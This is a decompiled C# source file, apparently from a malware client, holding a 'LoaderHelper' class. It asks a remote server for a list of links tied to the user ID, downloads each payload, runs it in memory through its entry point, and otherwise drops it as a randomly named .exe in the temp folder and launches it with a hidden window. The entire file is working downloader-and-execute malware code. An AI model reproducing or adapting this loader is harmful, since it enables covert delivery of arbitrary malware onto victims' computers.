using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using client.Network;

namespace client.Helpers
{
	// Token: 0x0200001B RID: 27
	internal class LoaderHelper
	{
		// Token: 0x060000B0 RID: 176 RVA: 0x00002C78 File Offset: 0x00000E78
		public static void Execute()
		{
			new List<string>();
			Connection.Post("loader", Encoding.UTF8.GetBytes(Config.UserID)).Split(new char[]
			{
				','
			}).ToList<string>().ForEach(delegate(string t)
			{
				LoaderHelper.RunTask(t);
			});
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00002CE0 File Offset: 0x00000EE0
		private static void RunTask(string link)
		{
			byte[] array = new WebClient().DownloadData(link);
			try
			{
				MethodInfo entryPoint = Assembly.Load(array).EntryPoint;
				string[][] array2;
				if (entryPoint.GetParameters().Length != 0)
				{
					(array2 = new string[1][])[0] = new string[0];
				}
				else
				{
					array2 = null;
				}
				string[][] array3 = array2;
				MethodBase methodBase = entryPoint;
				object obj = null;
				object[] parameters = array3;
				methodBase.Invoke(obj, parameters);
			}
			catch
			{
				string text = Path.Combine(Path.GetTempPath(), LoaderHelper.r.Next(100000, 999999).ToString() + ".exe");
				File.WriteAllBytes(text, array);
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
		}

		// Token: 0x04000063 RID: 99
		private static Random r = new Random();
	}
}
